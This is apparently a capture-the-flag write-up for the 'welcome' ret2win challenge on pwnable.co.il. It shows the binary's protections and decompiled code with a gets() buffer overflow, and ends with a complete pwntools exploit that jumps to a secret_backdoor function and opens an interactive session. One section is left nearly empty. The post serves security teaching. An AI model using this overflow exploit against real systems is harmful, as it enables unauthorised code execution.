---
title: "pwnable.co.il - welcome"
classes: wide
header:
  teaser: /assets/images/ctf-writeups/pwnable.co.il/logo.png
ribbon: green
description: "simple ret2win challenge."
categories:
  - CTF Writeups
  - pwn
---

> Challenge description:
>
> Welcome to Pwnable.co.il!
> I hope you'll like this one...

### Protections:
<pre>    Arch:       amd64-64-little
    RELRO:      <font color="#FFBC51">Partial RELRO</font>
    Stack:      <font color="#FF3C3C">No canary found</font>
    NX:         <font color="#49FF6D">NX enabled</font>
    PIE:        <font color="#FF3C3C">No PIE (0x400000)</font>
    Stripped:   <font color="#FF3C3C">No</font>
</pre>

Let's start by extracting the ELF file from the zip and analyzing it with the Hex-Rays decompiler:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char name[32]; // [rsp+0h] [rbp-20h] BYREF

  init_buffering(argc, argv, envp);
  puts("Welcome to pwnable.co.il!");
  puts("What is your name?");
  gets(name);
  printf("Thank you %s!\n", name);
  return 1;
}
```
Now we can easily see the vuln, the program uses `gets()`,
this gives us a buffer overflow (aka BOF) primitive, so we can overwrite stack data beyond the name buffer, including the saved return address.

The program also lacks a stack canary and is not PIE, 
so overwriting the return address with gadgets or functions and even building a ROP chain is a good approach.

### Functions list:

In our case

## payload
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './welcome')

### config ###
host = args.HOST or 'pwnable.co.il'
port = int(args.PORT or 9000)

### defines ###
PADDING = 40

### gadgets ###
ret = 0x000000000040076c

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def main():
    ### run ###
    io = start()

    ### payload ###
    payload = cyclic(PADDING)
    payload += p64(ret)
    payload += p64(exe.sym.secret_backdoor)

    io.sendline(payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```
